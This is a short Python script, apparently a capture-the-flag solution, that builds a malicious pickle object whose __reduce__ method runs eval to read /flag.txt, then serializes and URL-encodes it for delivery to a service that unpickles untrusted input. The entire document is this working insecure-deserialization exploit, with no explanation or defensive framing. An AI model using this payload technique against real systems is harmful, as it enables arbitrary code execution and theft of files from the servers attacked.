import pickle
import urllib
from urllib import parse

class payload(object):
    def __reduce__(self):
       return (eval, ("open('/flag.txt','r').read()",))

a = pickle.dumps(payload())
a = urllib.parse.quote(a)
print (a)

